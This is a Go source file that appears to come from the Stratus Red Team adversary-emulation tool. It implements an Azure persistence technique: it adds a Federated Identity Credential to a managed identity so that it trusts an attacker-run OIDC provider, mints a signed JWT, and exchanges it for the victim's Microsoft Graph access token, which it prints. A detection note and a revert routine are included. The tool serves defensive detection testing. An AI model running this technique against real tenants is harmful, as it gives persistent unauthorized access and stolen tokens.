package azure

import (
	"context"
	"crypto/rand"
	"crypto/rsa"
	"encoding/base64"
	"encoding/json"
	_ "embed"
	"errors"
	"fmt"
	"io"
	"log"
	"math/big"
	"net/http"
	"net/url"
	"time"

	"github.com/Azure/azure-sdk-for-go/sdk/resourcemanager/msi/armmsi"
	"github.com/Azure/azure-sdk-for-go/sdk/storage/azblob"
	jwt "github.com/golang-jwt/jwt/v4"
	"github.com/google/uuid"

	"github.com/datadog/stratus-red-team/v2/internal/providers"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus/mitreattack"
)

//go:embed main.tf
var tf []byte

const (
	oidcContainerName = "oidc"
	oidcSubject       = "stratus-red-team-oidc"
	oidcAudience      = "api://AzureADTokenExchange"
	ficName           = "stratus-red-team-oidc-fic"
	tokenTTL          = 10 * time.Minute
	ficWaitTime       = 30 * time.Second
)

type oidcDiscovery struct {
	Issuer                           string   `json:"issuer"`
	JwksURI                          string   `json:"jwks_uri"`
	ResponseTypesSupported           []string `json:"response_types_supported"`
	SubjectTypesSupported            []string `json:"subject_types_supported"`
	IDTokenSigningAlgValuesSupported []string `json:"id_token_signing_alg_values_supported"`
}

type jwkKey struct {
	Kty string `json:"kty"`
	Use string `json:"use"`
	Alg string `json:"alg"`
	Kid string `json:"kid"`
	N   string `json:"n"`
	E   string `json:"e"`
}

type jwkSet struct {
	Keys []jwkKey `json:"keys"`
}

func init() {
	stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
		ID:           "azure.persistence.backdoor-managed-identity-fic",
		FriendlyName: "Backdoor Azure Managed Identity with Federated Identity Credential (FIC)",
		Description: `
Backdoors an existing Azure Managed Identity by creating a new Federated Identity Credential (FIC) that trusts an attacker-controlled OIDC provider.

Warm-up:

- Create a resource group and victim Azure Managed Identity
- Assign it the <code>Directory Readers</code> role at the tenant level (for illustration purposes)
- Create an Azure Storage account to host the attacker-controlled OIDC provider metadata

Detonation:

- Generate a keypair to use for OIDC
- Upload OIDC discovery document and JWKS to the storage account
- Add a Federated Identity Credential (FIC) to the victim Managed Identity that trusts tokens issued by the malicious OIDC provider
- Create a token signed by the attacker's OIDC private key to exchange for a token as the victim Managed Identity
- Exchange the attacker's token for a Microsoft Graph token as the victim Managed Identity using the FIC
- Display the victim Managed Identity's access token to the user

References:

- https://dirkjanm.io/persisting-with-federated-credentials-entra-apps-managed-identities/
- https://github.com/azurekid/blackcat/pull/84/changes
- https://learn.microsoft.com/en-us/graph/api/resources/federatedidentitycredentials-overview
- https://hackingthe.cloud/aws/post_exploitation/iam_rogue_oidc_identity_provider/
`,
		Detection: `
Using [Azure Activity Logs](https://learn.microsoft.com/en-us/azure/azure-monitor/essentials/activity-log) with the operation name <code>Microsoft.ManagedIdentity/userAssignedIdentities/federatedIdentityCredentials/write</code>.
`,
		Platform:                   stratus.Azure,
		IsIdempotent:               false,
		MitreAttackTactics:         []mitreattack.Tactic{mitreattack.Persistence, mitreattack.PrivilegeEscalation},
		PrerequisitesTerraformCode: tf,
		Detonate:                   detonate,
		Revert:                     revert,
	})
}

func detonate(params map[string]string, providers stratus.CloudProviders) error {
	ctx := context.Background()

	managedIdentityName := params["managed_identity_name"]
	managedIdentityClientId := params["managed_identity_client_id"]
	resourceGroupName := params["resource_group_name"]
	storageAccountName := params["storage_account_name"]
	blobServiceURL := params["blob_service_url"]

	azureProvider := providers.Azure()

	subscriptionId := azureProvider.SubscriptionID
	tenantId, err := providers.EntraId().GetTenantId()
	if err != nil {
		return fmt.Errorf("could not retrieve tenant ID: %w", err)
	}

	// Generate RSA keypair for the attacker-controlled OIDC provider
	log.Println("Generating RSA keypair for attacker OIDC provider...")
	privateKey, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		return fmt.Errorf("could not generate RSA keypair: %w", err)
	}
	keyID := uuid.NewString()

	issuerURL := fmt.Sprintf("https://%s.blob.core.windows.net/%s", storageAccountName, oidcContainerName)

	// Upload OIDC discovery document and JWKS to the storage account
	log.Printf("Uploading OIDC metadata to %s...", issuerURL)
	if err := uploadOIDCDocuments(azureProvider, blobServiceURL, issuerURL, privateKey, keyID); err != nil {
		return fmt.Errorf("could not upload OIDC documents: %w", err)
	}

	// Create FIC client for managed identity operations
	ficClient, err := armmsi.NewFederatedIdentityCredentialsClient(subscriptionId, azureProvider.GetCredentials(), nil)
	if err != nil {
		return fmt.Errorf("could not create FIC client: %w", err)
	}

	// Add FIC to the victim managed identity, trusting the attacker OIDC provider
	log.Println("Adding Federated Identity Credential to victim managed identity...")
	ficIssuer := issuerURL
	ficSubject := oidcSubject
	ficAudiences := []*string{strPtr(oidcAudience)}

	ficParams := armmsi.FederatedIdentityCredential{
		Properties: &armmsi.FederatedIdentityCredentialProperties{
			Issuer:    &ficIssuer,
			Subject:   &ficSubject,
			Audiences: ficAudiences,
		},
	}

	fic, err := ficClient.CreateOrUpdate(ctx, resourceGroupName, managedIdentityName, ficName, ficParams, nil)
	if err != nil {
		return fmt.Errorf("could not create FIC: %w", err)
	}
	log.Printf("Created FIC '%s' (issuer: %s, subject: %s)", *fic.Name, issuerURL, oidcSubject)

	// Wait for FIC and OIDC metadata to propagate
	log.Printf("Waiting %s for FIC and OIDC metadata to propagate...", ficWaitTime)
	time.Sleep(ficWaitTime)

	// Issue token signed by the attacker's OIDC private key
	log.Println("Issuing token as attacker OIDC provider for exchange...")
	oidcToken, err := mintOIDCToken(privateKey, keyID, issuerURL)
	if err != nil {
		return fmt.Errorf("could not create OIDC token: %w", err)
	}

	// Exchange the attacker JWT for a victim managed identity access token
	log.Println("Exchanging OIDC token for victim managed identity access token via FIC...")
	victimToken, err := exchangeTokenUsingFIC(tenantId, managedIdentityClientId, oidcToken)
	if err != nil {
		return fmt.Errorf("could not exchange token via FIC: %w", err)
	}

	log.Println("Obtained victim managed identity access token via malicious OIDC FIC backdoor")
	log.Println("\nVictim managed identity Microsoft Graph token:")
	log.Println(victimToken)

	log.Println("\nYou can now use this token to access Microsoft Graph API as the victim managed identity.")

	return nil
}

func revert(params map[string]string, providers stratus.CloudProviders) error {
	ctx := context.Background()

	managedIdentityName := params["managed_identity_name"]
	resourceGroupName := params["resource_group_name"]
	blobServiceURL := params["blob_service_url"]

	azureProvider := providers.Azure()
	subscriptionId := azureProvider.SubscriptionID

	// Create FIC client for managed identity operations
	ficClient, err := armmsi.NewFederatedIdentityCredentialsClient(subscriptionId, azureProvider.GetCredentials(), nil)
	if err != nil {
		return fmt.Errorf("could not create FIC client: %w", err)
	}

	// List and remove FICs from the victim managed identity
	log.Println("Listing FICs for managed identity " + managedIdentityName)
	pager := ficClient.NewListPager(resourceGroupName, managedIdentityName, nil)

	ficCount := 0
	for pager.More() {
		page, err := pager.NextPage(ctx)
		if err != nil {
			return fmt.Errorf("could not list FICs: %w", err)
		}

		for _, credential := range page.Value {
			if credential.Name == nil {
				continue
			}
			log.Println("Deleting FIC: " + *credential.Name)
			_, err := ficClient.Delete(ctx, resourceGroupName, managedIdentityName, *credential.Name, nil)
			if err != nil {
				return fmt.Errorf("could not delete FIC: %w", err)
			}
			ficCount++
		}
	}

	if ficCount == 0 {
		log.Println("No FICs found to delete")
	} else {
		log.Printf("Successfully removed %d FIC(s) from victim managed identity", ficCount)
	}

	// Delete the OIDC container (storage account is managed by Terraform)
	log.Printf("Deleting OIDC container from storage account...")
	if err := deleteOIDCContainer(azureProvider, blobServiceURL); err != nil {
		log.Printf("Warning: could not delete OIDC container: %v", err)
	} else {
		log.Println("Deleted OIDC container")
	}

	return nil
}

func strPtr(s string) *string {
	return &s
}

// deleteOIDCContainer deletes the OIDC container from the storage account.
func deleteOIDCContainer(azureProvider *providers.AzureProvider, blobServiceURL string) error {
	ctx := context.Background()
	blobClient, err := azblob.NewClient(blobServiceURL, azureProvider.GetCredentials(), nil)
	if err != nil {
		return fmt.Errorf("could not create blob client: %w", err)
	}
	_, err = blobClient.DeleteContainer(ctx, oidcContainerName, nil)
	return err
}

// uploadOIDCDocuments creates the OIDC container and uploads the discovery document and JWKS.
func uploadOIDCDocuments(azureProvider *providers.AzureProvider, blobServiceURL, issuerURL string, privateKey *rsa.PrivateKey, keyID string) error {
	ctx := context.Background()
	blobClient, err := azblob.NewClient(blobServiceURL, azureProvider.GetCredentials(), nil)
	if err != nil {
		return fmt.Errorf("could not create blob client: %w", err)
	}

	publicAccess := azblob.PublicAccessTypeBlob
	_, err = blobClient.CreateContainer(ctx, oidcContainerName, &azblob.CreateContainerOptions{
		Access: &publicAccess,
	})
	if err != nil {
		return fmt.Errorf("could not create OIDC container: %w", err)
	}

	pubKey := &privateKey.PublicKey
	jwksDoc := jwkSet{
		Keys: []jwkKey{{
			Kty: "RSA",
			Use: "sig",
			Alg: "RS256",
			Kid: keyID,
			N:   base64.RawURLEncoding.EncodeToString(pubKey.N.Bytes()),
			E:   base64.RawURLEncoding.EncodeToString(big.NewInt(int64(pubKey.E)).Bytes()),
		}},
	}
	jwksJSON, err := json.Marshal(jwksDoc)
	if err != nil {
		return err
	}

	discoveryDoc := oidcDiscovery{
		Issuer:                           issuerURL,
		JwksURI:                          issuerURL + "/jwks",
		ResponseTypesSupported:           []string{"id_token"},
		SubjectTypesSupported:            []string{"public"},
		IDTokenSigningAlgValuesSupported: []string{"RS256"},
	}
	discoveryJSON, err := json.Marshal(discoveryDoc)
	if err != nil {
		return err
	}

	if _, err := blobClient.UploadBuffer(ctx, oidcContainerName, "jwks", jwksJSON, nil); err != nil {
		return fmt.Errorf("could not upload JWKS: %w", err)
	}
	if _, err := blobClient.UploadBuffer(ctx, oidcContainerName, ".well-known/openid-configuration", discoveryJSON, nil); err != nil {
		return fmt.Errorf("could not upload OIDC discovery document: %w", err)
	}

	log.Printf("OIDC discovery: %s/.well-known/openid-configuration", issuerURL)
	log.Printf("JWKS: %s/jwks", issuerURL)
	return nil
}

// mintOIDCToken creates a signed JWT as the attacker OIDC provider, targeting Entra ID token exchange.
func mintOIDCToken(privateKey *rsa.PrivateKey, keyID, issuerURL string) (string, error) {
	claims := jwt.MapClaims{
		"iss": issuerURL,
		"sub": oidcSubject,
		"aud": oidcAudience,
		"iat": time.Now().Unix(),
		"nbf": time.Now().Unix(),
		"exp": time.Now().Add(tokenTTL).Unix(),
		"jti": uuid.NewString(),
	}
	token := jwt.NewWithClaims(jwt.SigningMethodRS256, claims)
	token.Header["kid"] = keyID
	return token.SignedString(privateKey)
}

// exchangeTokenUsingFIC exchanges a client assertion JWT for a victim managed identity token using the FIC.
func exchangeTokenUsingFIC(tenantId, victimClientId, clientAssertion string) (string, error) {
	tokenURL := fmt.Sprintf("https://login.microsoftonline.com/%s/oauth2/v2.0/token", tenantId)

	data := url.Values{}
	data.Set("client_id", victimClientId)
	data.Set("scope", "https://graph.microsoft.com/.default")
	data.Set("client_assertion_type", "urn:ietf:params:oauth:client-assertion-type:jwt-bearer")
	data.Set("client_assertion", clientAssertion)
	data.Set("grant_type", "client_credentials")

	resp, err := http.PostForm(tokenURL, data)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}

	if resp.StatusCode != 200 {
		return "", fmt.Errorf("token exchange failed with status %d: %s", resp.StatusCode, string(body))
	}

	var result map[string]interface{}
	if err := json.Unmarshal(body, &result); err != nil {
		return "", err
	}

	token, ok := result["access_token"].(string)
	if !ok {
		return "", errors.New("access_token not found in response")
	}
	return token, nil
}
